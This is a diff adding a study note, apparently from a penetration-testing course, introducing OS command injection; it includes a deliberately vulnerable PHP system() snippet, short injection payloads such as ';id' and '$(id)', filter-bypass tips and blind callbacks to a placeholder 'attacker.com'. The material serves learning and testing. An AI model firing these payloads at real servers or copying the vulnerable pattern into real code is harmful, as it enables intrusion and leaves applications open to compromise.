@@ -1,0 +1,110 @@
+🧠 Summary: Command Injection - Intro
+Command Injection is a critical vulnerability that lets an attacker execute arbitrary system-level commands on the server hosting a web application. This can lead to full system compromise and even pivoting into internal networks.
+
+The issue arises when user input is passed directly into OS-level command execution functions (e.g., system(), exec(), etc.) without proper sanitization or validation. These commands get interpreted by the shell, and attackers can escape the intended command and append their own.
+
+📌 What is Injection (Generally)?
+OWASP Rank: #3 in Top 10 Risks.
+
+Core Concept: Happens when user input is treated as code or query instead of data.
+
+Result: Manipulated logic or execution path.
+
+Common Types of Injections:
+Type	What It Does
+OS Command Injection	Executes system commands
+SQL Injection	Modifies DB queries
+Code Injection	Inserts/executes code directly
+XSS/HTML Injection	Renders raw HTML/JS in page
+Others	LDAP, XPath, NoSQL, Header Injection, etc.
+💣 OS Command Injection Breakdown
+🔥 Vulnerability Pattern:
+Server uses user-controlled input inside a system-level command function.
+
+Input is not sanitized or validated.
+
+Function executes the whole string including injected payloads.
+
+🔧 Common Vulnerable Functions:
+Language	Functions
+PHP	system(), exec(), shell_exec(), passthru(), popen()
+NodeJS	child_process.exec(), child_process.spawn()
+Python	os.system(), subprocess.*()
+Others	Any wrapper over system commands without input validation
+💥 Real World Example (PHP):
+php
+Copy
+Edit
+<?php
+if (isset($_GET['filename'])) {
+    system("touch /tmp/" . $_GET['filename'] . ".pdf");
+}
+?>
+User sends: ?filename=report
+
+App runs: touch /tmp/report.pdf
+
+Attacker sends: ?filename=report;id
+
+App runs: touch /tmp/report.pdf;id → Command Injection 🔥
+
+🧭 IF THIS, THEN THAT (ITTTT) - Command Injection Detection/Exploitation
+Condition	Action
+🟢 Input is reflected in system command output (e.g., using ;id, &&whoami)	Try basic injections: ;, &&, `
+🟢 Web response includes system output	Confirm blind vs non-blind injection
+🔒 Output not visible	Switch to blind injection techniques: use timing (sleep), file creation, DNS/callbacks
+⚠️ Input used inside command but partially filtered	Try obfuscation (e.g., hex-encoded commands, whitespace variation, bypassing filters)
+🔄 App uses different language (NodeJS, Python, etc.)	Same principles apply — functions may change, but execution flow doesn’t
+🔁 Thick client or binary takes user input and interacts with system	Command injection may apply — fuzz it
+🧱 Input surrounded by quotes	Inject like: ";id;# or ' && id #'
+🧪 Unsure where input lands	Use injection markers like ;ping -c 1 attacker.com and check your listener for requests
+🎯 Hints, Patterns, and Exploitation Clues
+🔍 Common Input Vectors:
+
+URL params (?filename=), form inputs, file uploads, cookies, headers
+
+🚧 Sanitization Check:
+
+Try ;, &&, | → see what’s blocked
+
+📡 Blind Detection Tactics:
+
+sleep 5, ping, or write files (echo test > /tmp/test)
+
+🧪 Payload Starters:
+
+; whoami
+
+| id
+
+&& uname -a
+
+`id`
+
+$(id)
+
+👻 Blind Confirmations:
+
+;sleep 10 (watch for delay)
+
+;ping -c 1 YOURIP (capture via tcpdump/netcat)
+
+🧩 Filter Bypasses:
+
+Try using $IFS, null bytes, env vars, or char-by-char injection
+
+🧬 Patterns You’ll Start Recognizing:
+Inputs that are used as filenames or system paths (like ping, cat, ls, touch) often get directly passed to commands.
+
+If a function’s behavior depends on shell interaction, it’s a candidate for injection.
+
+If responses change subtly when you add shell operators, you’ve hit something juicy.
+
+If sanitization is applied poorly (e.g., just escapeshellcmd()), bypasses are often possible.
+
+🏁 Next Steps
+This intro sets the foundation for all the payload testing you’ll do later. Next module probably dives into manual testing, detection methodology, and blind exploitation techniques.
+
+But for now — remember this:
+
+"Anywhere user input influences command execution is a landmine waiting to be stepped on."
